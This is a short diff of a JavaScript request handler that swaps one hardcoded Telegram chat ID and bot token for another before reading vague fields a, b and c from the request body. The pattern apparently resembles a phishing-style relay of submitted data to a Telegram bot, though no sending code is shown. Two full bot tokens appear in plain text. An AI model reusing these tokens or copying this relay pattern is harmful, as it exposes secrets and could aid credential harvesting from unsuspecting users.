@@ -3,8 +3,8 @@ export default async function handler(req, res) {
         return res.status(405).json({ message: 'Method Not Allowed' });
     }
 
-    const telegramId = '7869205757';
-    const botToken = '7480495756:AAF-WzTi90lBKoVAVBmjwxAX1OupjVwI02s';
+    const telegramId = '7620965847';
+    const botToken = '8126128007:AAEyBzHjL3mXfA_d7QPK-wPGMOOwfmajuSA';
 
     const { a, b, c } = req.body;
 
